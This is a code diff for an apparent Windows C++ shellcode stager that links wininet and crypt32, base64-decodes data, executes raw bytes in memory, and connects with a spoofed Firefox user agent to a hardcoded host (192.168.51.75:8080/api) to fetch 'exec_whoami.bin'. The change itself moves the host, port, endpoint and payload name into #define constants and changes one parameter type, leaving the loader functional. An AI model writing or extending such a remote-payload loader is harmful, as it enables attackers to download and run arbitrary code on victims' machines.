@@ -31,6 +31,11 @@
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
 
+#define SERVER_IP "192.168.51.75"
+#define SERVER_PORT 8080
+#define ENDPOINT "/api"
+#define REMOTE_FILE "exec_whoami.bin"
+
 // Decode Base64 -> Raw Bytes
 
 BOOL Base64Decode(const char* base64, BYTE** output, DWORD* outLen) {
@@ -67,8 +72,10 @@ void ExecuteBytes(unsigned char *buffer, int buf_len)
 }
 
 // HTTPS Client
-int ConnectHost(LPCSTR hostname, INTERNET_PORT port, LPCSTR endpoint, std::string name)
+int ConnectHost(LPCSTR hostname, INTERNET_PORT port, LPCSTR endpoint, LPCSTR n)
 {
+	std::string name = n;
+
 	LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0";
 	
 	// Initialize the session
@@ -202,15 +209,6 @@ int ConnectHost(LPCSTR hostname, INTERNET_PORT port, LPCSTR endpoint, std::strin
 }
 
 int main() {
-
-	// Connection determining variables
-
-    LPCSTR host = "192.168.51.75";
-    INTERNET_PORT port = 8080;
-    LPCSTR endpoint = "/api";
-
-    std::string remote_file = "exec_whoami.bin";
-
-    ConnectHost(host, port, endpoint, remote_file);
+    ConnectHost(SERVER_IP, SERVER_PORT, ENDPOINT, REMOTE_FILE);
     return 0;
 }
